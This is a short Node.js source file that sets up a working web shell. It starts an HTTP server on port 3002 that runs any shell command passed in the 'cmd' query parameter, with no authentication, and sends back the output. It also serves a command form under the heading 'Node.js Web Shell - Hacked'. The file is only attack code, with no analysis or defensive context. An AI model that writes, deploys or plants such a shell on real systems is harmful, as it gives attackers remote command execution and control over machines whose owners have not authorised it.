// === SIMPLE NODE.JS WEB SHELL ===
const http = require('http');
const { exec } = require('child_process');

http.createServer((req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const cmd = url.searchParams.get('cmd');

    if (cmd) {
        exec(cmd, { shell: true }, (error, stdout, stderr) => {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(stdout || stderr || error?.message || 'No output');
        });
    } else {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <h1>Node.js Web Shell - Hacked</h1>
            <form action="" method="get">
                <input type="text" name="cmd" placeholder="whoami" style="width:400px;padding:10px;font-size:16px;">
                <button type="submit" style="padding:10px 20px;">Execute</button>
            </form>
            <pre>Current IP: 192.168.45.1</pre>
        `);
    }
}).listen(3002);

console.log('Web Shell running on port 3002');